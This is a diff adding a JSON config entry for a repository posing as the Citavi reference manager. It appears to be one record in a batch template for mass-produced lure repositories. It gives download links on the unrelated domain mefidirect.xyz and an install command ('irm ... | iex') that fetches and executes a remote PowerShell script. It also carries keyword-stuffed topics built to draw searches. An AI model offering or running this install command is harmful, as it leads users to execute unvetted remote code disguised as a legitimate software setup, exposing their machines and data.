@@ -1,0 +1,29 @@
+{
+  "repo": "citavi-research-project-manager",
+  "product": "Citavi Research Project Manager",
+  "kind": "research",
+  "install_type": "download",
+  "download_url": "https://citavi.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "research",
+  "topics": [
+    "citavi-pack",
+    "citavi-utility",
+    "citavi-reference-manager",
+    "citavi-desktop-windows",
+    "citavi-connection-fix",
+    "citavi-windows-guide",
+    "citavi-citation-manager",
+    "citavi-native-app",
+    "citavi-install-steps",
+    "citavi-steps-2026",
+    "citavi-package",
+    "desktop-tools",
+    "setup-guide",
+    "education-tools",
+    "pc-software"
+  ]
+}
